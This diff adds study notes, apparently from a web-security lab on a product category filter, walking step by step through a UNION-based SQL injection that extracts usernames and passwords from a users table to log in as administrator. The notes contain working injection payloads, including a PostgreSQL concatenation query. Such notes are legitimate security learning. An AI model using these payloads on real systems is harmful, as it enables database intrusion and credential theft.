@@ -1,0 +1,32 @@
+SQL Injection - Product category filter
+
+End Goal: retrieve all usernames and passwords and login as the administrator user.
+
+Analysis:
+---------
+
+1. Determine # of columns that the vulnerable quiery is using:
+    'order by 1 -- > not displayed on the page
+    'order by 2 -- > displayed on the page
+    'order by 3 -- > Internal server error
+    => 3 - 1 = 2 columns
+2. Find which column contain text:
+    select a, b from Products where category='Gifts
+    'UNION select 'text', NULL -- > not visiable
+    'UNION select NULL, 'text' -- > accept string value
+    => column 2 is of data type string 
+
+3. Output data from other tables
+    ' UNION select NULL, username from users--
+    ' UNION select NULL, password from users--
+
+    We have to use string concatenation to combine username and password into a sigle column. Different databases has different syntax for strig concatenation. So, first we have to know database server name using version command and based on that information we are going to use a syntax for that perticular database for string concatenation.
+
+    suppose the database sever : PostgreSQL
+
+    new command : ' UNION select NULL, username || '*' || password from users--
+
+
+
+
+
